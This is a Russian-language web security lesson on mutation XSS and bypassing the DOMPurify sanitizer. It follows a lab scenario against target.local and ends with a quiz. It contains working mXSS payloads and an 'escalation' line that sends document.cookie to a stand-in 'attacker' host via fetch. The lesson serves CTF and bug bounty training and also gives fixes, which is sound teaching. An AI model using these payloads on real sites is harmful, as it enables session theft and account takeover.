---
id: web-mxss
title: "mXSS и обход санитайзеров (DOMPurify)"
category: web
parent: web-dom-clobbering
difficulty: hard
order: 2
tags: [mxss, xss, dompurify, sanitizer, html-parsing, mutation]
prerequisites: [web-xss, web-dom-clobbering]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Почему браузерный парсер HTML и санитайзер видят разное дерево и как из-за этого проскакивает XSS."
---

## Задача

На `https://target.local` есть поле «bio» в профиле. Приложение чистит ввод через **DOMPurify** и вставляет результат в `innerHTML`. Наша обычная XSS-строка отфильтрована. Вопрос: можно ли обойти санитайзер?

**mXSS (mutation XSS)** — класс XSS, при котором санитайзер один раз разбирает и «очищает» HTML, но браузер при повторном разборе строит **другое** DOM-дерево, и вычищенный тег «мутирует» обратно в исполняемый. Это главный способ обойти DOMPurify-подобные фильтры.

## Данные, с которыми работаем

Поле `POST /profile` (`bio`), клиентская очистка `DOMPurify 2.0.0`, вставка через `innerHTML`. Пейлоад-кандидат:

```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

## Теория: HTML-парсер не один, и он контекстный

Ключ к mXSS — рассинхронизация между двумя представлениями:

1. **Текст → DOM** (парсинг): авто-закрытие тегов, разбор `<table>`, `<svg>`, `<math>`, raw-text элементов (`<style>`, `<textarea>`, `<title>`, `<noscript>`), foreign content.
2. **DOM → текст** (сериализация, `innerHTML`): обратное преобразование может дать строку, **отличающуюся** от исходной.

Санитайзер обычно делает `DOMPurify.sanitize(html)` → строку → приложение вставляет её в `innerHTML`. Если строка при повторной вставке парсится иначе — рождается XSS.

Классические источники мутации: неправильная вложенность (`<b><i></b></i>`), foreign content (SVG/MathML), raw-text (`<style>`, `<textarea>`), `<noscript>`, `<template>`, comment-based (`<--!>`).

## Почему DOMPurify иногда пробивается

- Версии до патча уязвимы к конкретным mXSS-векторам (CVE-2020-26870, CVE-2024-45801/45802).
- Если приложение вызывает `sanitize` **несколько раз** или добавляет контекст после очистки — повторный парсинг.
- **Контекст вставки** не совпадает с контекстом очистки (санитайз для `<div>`, вставка в `<table>`/`<svg>`).

Правило: «DOMPurify есть» ≠ «XSS невозможен». Проверяй **версию** и **как** приложение использует результат.

## Шаг 1: определить санитайзер и версию

```bash
$ curl -s https://target.local/ | grep -oiE 'dompurify[^"]*\.js'
/js/dompurify.min.js
$ curl -s https://target.local/js/dompurify.min.js | head -c 120
/*! @license DOMPurify 2.0.0 | ... */
```

Версия `2.0.0` — старее пропатченных; повышаем шанс mXSS.

## Шаг 2: проверить двойной парсинг в DevTools

```js
const raw = '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(raw);
console.log('clean:', clean);

const d = document.createElement('div');
d.innerHTML = clean;                       // повторный парсинг, как делает браузер
console.log('reparsed:', d.innerHTML);     // мутировало ли в <img onerror>
```

Если `reparsed` содержит `<img ... onerror=alert(1)>` вне контекста `<style>` — мутация подтверждена. Ключ — сравнить цепочку `input → DOM → serialize → parse` снова.

## Шаг 3: подобрать mXSS-вектор под версию

| Класс | Механизм | Намёк |
|-------|----------|-------|
| Raw-text мутация | `<style>`/`<textarea>` содержимое парсится как текст | `</style>` «выходит» при сериализации |
| Foreign content | SVG/MathML namespace-правила | `<math><mtext><table>...` |
| Неправильная вложенность | авто-закрытие тегов | `<b><i></b></i>` |
| `<noscript>` | двойная интерпретация | `<noscript><p title="</noscript><img onerror=...>` |
| `<template>` | содержимое шаблона | `<template><img onerror=...>` |
| Comment-based | `<!-- -->` | `<--!><img onerror=...>` |
| Serialization round-trip | DOM→строка→DOM | двойной sanitize |

## Шаг 4: воспроизвести в реальном поле

```bash
$ curl -s -X POST https://target.local/profile \
  --data-urlencode 'bio=<math><mtext><table><mglyph><style><img src=x onerror=alert(document.domain)>' \
  -b 'session=me'
```

Смотрим, сработал ли `alert` при отображении профиля.

## Шаг 5: эскалация

```html
<img src=x onerror="fetch('https://attacker/collect?c='+encodeURIComponent(document.cookie))">
```

В отчёте: точный payload, версия DOMPurify, цепочка вызовов `sanitize`, доказательство исполнения (скриншот консоли/коллаборатор).

## Полный прогон от начала до конца

1. Определили санитайзер: `DOMPurify 2.0.0`.
2. DevTools: `parse(sanitize(x))` ≠ `sanitize(x)` → мутация.
3. Вектор: foreign content + raw-text (`<math><mtext><table><mglyph><style>...`).
4. Отправили в `bio` → `alert(document.domain)` сработал.
5. Эскалация до кражи cookie.

## Известные CVE и классификация

- **CVE-2020-26870** — mXSS (исправлено в 2.0.17).
- **CVE-2024-45801** — prototype pollution → обход (2.5.4/2.5.6).
- **CVE-2024-45802** — mXSS (2.5.4/2.5.6).

```bash
$ curl -s https://target.local/js/dompurify.min.js | grep -oE 'DOMPurify [0-9.]+'
DOMPurify 2.0.0        # устарела, mXSS вероятен
```

Классификация для отчёта: **reflected** — ввод отражается без очистки; **stored** — сохраняется и отдаётся другим; **DOM** — ввод попадает в sink через JS; **mXSS** — частный случай, где санитайзер пропустил, но браузер мутировал разметку. Указывай sink (`innerHTML`), санитайзер и версию, число повторных парсингов, класс мутации.

## Если не сработало — пробуй это

- **Верил, что DOMPurify «непробиваем».** Нужны версия и контекст — mXSS-баги находятся регулярно.
- **Тестировал не в том контексте.** Санитайз для `<div>`, вставка в `<svg>`/`<table>` — разные модели.
- **Забыл про foreign content.** `<svg>`, `<math>` — основной источник мутаций.
- **Игнорировал raw-text/RCDATA.** `<style>`, `<textarea>`, `<title>`, `<noscript>` — частые точки мутации.
- **Серверная очистка.** Ищи расхождение между серверным парсером (Go/Java) и браузерным — тот же принцип.

## DOM Invader и автоматизация

Burp **DOM Invader** (встроен в Burp Browser) автоматически ищет DOM-XSS sink'и, каналы (postMessage, storage, hash) и проверяет, доходит ли ввод до `innerHTML`/`eval`:

1. Включи DOM Invader, задай canary (уникальную строку).
2. Пройдись по приложению — расширение подсветит sink'и и каналы.
3. Вставь mXSS-payload в найденное поле и проверь мутацию.

Дополнительно: коллекции `sanitizer-bypass` (payloadbox, PortSwigger XSS cheat sheet) и собственный fuzzer, который сравнивает `parse(sanitize(x))` с `sanitize(parse(x))`.

## Быстрый тест mXSS

1. Найти sink: `innerHTML`, `insertAdjacentHTML`, `outerHTML`, `document.write`.
2. Найти санитайзер и версию (DOMPurify и т.п.).
3. Сравнить `sanitize(x)` и `parse(sanitize(x))` — если дерево меняется, есть мутация.
4. Подобрать вектор под версию (foreign content/raw-text/`<noscript>`).
5. Доказать `alert(document.domain)`, затем эскалировать.

## Что мы теперь знаем

- mXSS — это рассинхронизация парсинга/сериализации между санитайзером и браузером.
- «DOMPurify есть» ≠ «XSS невозможен» — нужна версия и контекст.
- Foreign content (SVG/MathML) и raw-text — основные источники мутаций.
- Двойной `sanitize` и несовпадение контекста вставки усиливают мутацию.
- Доказательство — `alert`, эскалация — кража cookie/localStorage.

## На что смотреть дальше

- **DOM Invader.** Автоматически ищет sink'и, каналы и проверяет достижимость ввода.
- **Версия санитайзера.** Сравнивай с последней; старые уязвимы.
- **Контекст очистки.** Санитайз для `<div>` не защищает `<svg>`/`<table>`.
- **Серверные санитайзеры.** Расхождение серверного и браузерного парсеров — тот же принцип.
- **Фикс.** Обновление санитайзера + корректный контекст + отказ от двойного `sanitize`.

## Квиз

Проверь себя.

```quiz
- question: "В чём суть mXSS?"
  options:
    - "Сервер возвращает 500"
    - "Санитайзер и браузер строят разное DOM-дерево, и тег мутирует в исполняемый"
    - "XSS через cookie"
    - "Отравление DNS"
  answer: 1
  explanation: "Рассинхронизация парсинга/сериализации между санитайзером и браузером."
- question: "Какой элемент чаще всего участвует в raw-text мутациях?"
  options:
    - "style"
    - "h1"
    - "b"
    - "p"
  answer: 0
  explanation: "style/textarea/title — raw-text/RCDATA, их содержимое парсится как текст."
- question: "Что обязательно проверить, если на сайте стоит DOMPurify?"
  options:
    - "Ничего, он всё чистит"
    - "Версию и то, как приложение использует результат (сколько раз и куда вставляет)"
    - "Только цвет кнопки"
    - "Заголовок Server"
  answer: 1
  explanation: "mXSS-баги зависят от версии и от контекста/числа повторных парсингов."
- question: "Как воспроизвести mXSS в DevTools?"
  options:
    - "Сравнить input → DOM → serialize → снова parse"
    - "Отключить JavaScript"
    - "Сменить User-Agent"
    - "Включить HTTP/2"
  answer: 0
  explanation: "Нужно увидеть, как дерево меняется между очисткой и повторной вставкой."
- question: "Почему foreign content (SVG/MathML) важен для mXSS?"
  options:
    - "Он ускоряет сайт"
    - "Namespace-правила разбора отличаются и легко рассинхронизируются с HTML-контекстом"
    - "Он блокирует CSP"
    - "Он шифрует данные"
  answer: 1
  explanation: "SVG/MathML парсятся по другим правилам, что и даёт мутации на границах."
```

## Куда дальше

Дальше мы закрепим клиентскую безопасность на практике: связка CSP + Trusted Types + mXSS показывает, что «защита стоит» — ещё не «баг закрыт». А пока главное запомни: mXSS живёт там, где парсер санитайзера и парсер браузера расходятся.

## Где пригодится

- **CTF (Web):** задачи, где «санитайзер стоит, XSS невозможен» — почти всегда mXSS.
- **Bug bounty:** обход DOMPurify/санитайзеров в rich-text — высокооплачиваемый класс.
- **Пентест:** проверка rich-text полей, markdown-рендереров, SSR-гидрации.
- **Работа (AppSec/Dev):** осознанный выбор контекста очистки, обновление DOMPurify, отказ от двойного sanitize.
